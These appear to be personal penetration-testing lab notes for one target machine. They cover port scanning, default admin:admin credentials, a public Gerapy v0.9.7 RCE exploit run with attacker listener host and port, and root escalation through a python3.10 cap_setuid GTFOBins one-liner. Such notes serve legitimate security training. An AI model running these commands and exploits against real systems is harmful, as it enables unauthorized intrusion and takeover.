### Enumeration
```
IP=192.168.165.24
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,8000 -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
- 8000
### Foothold
- 8000
	- Default landing page
		- ![[Pasted image 20240813114307.png]]
		- ![[Pasted image 20240813114335.png]]
	- Login
		- admin:admin
	- Versions
		- Gerapy v0.9.7
			- python/remote/50640.py
			- RCE
			- python 50640.py --lh 192.168.45.163 --lp 21 -t 192.168.165.24 -p 8000
				- Leads to RCE
				- Must have a project
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- app
	- id
		- uid=1000(app) gid=1000(app) groups=1000(app)
	- sudo -l
		- needs password
	- uname -a
		- `Linux ubuntu 5.15.0-73-generic #80-Ubuntu SMP Mon May 15 15:18:26 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- python3.10
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- app
	- netstat -ano
		- Active ports
	- linpeas
		- Possible Exploits
			- pwnkit
			- dirty cow
		- Interesting Files
			- /usr/bin/python3.10 cap_setuid=ep
			- gtfobins
				- `./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
				- ![[Pasted image 20240813115409.png]]
	- pspy64
### Credentials
### Lessons Learned